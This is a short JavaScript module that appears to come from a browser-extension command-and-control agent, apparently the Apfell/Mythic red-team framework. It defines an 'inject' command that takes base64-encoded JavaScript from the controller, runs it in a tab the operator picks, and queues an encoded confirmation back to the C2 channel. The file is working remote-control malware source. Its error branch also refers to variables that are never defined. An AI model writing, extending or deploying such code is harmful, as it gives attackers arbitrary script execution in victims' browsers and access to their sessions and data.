inject = function(task) {
    // execute custom javascript code in a tab
    let args = JSON.parse(atob(task['params'].toString()));
    const tab = Math.round(args["tabid"]);
    const code = atob(args["javascript"]);
    chrome.tabs.executeScript(tab, {
        code: code
    }, function(){
        if (chrome.runtime.lastError) {
            C2.sendError(taskid, tasktype);
        } else {
            response = {"task_id":task['task_id'], "user_output":"injected code into tab with id " + tab, "completed": true};
            outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
            enc = JSON.stringify(outer_response);
            final = apfell.apfellid + enc;
            msg = btoa(unescape(encodeURIComponent(final)));
            out.push(msg);
        }
    });
};

C2.commands[inject.name] = inject;
COMMAND_ENDS_HERE
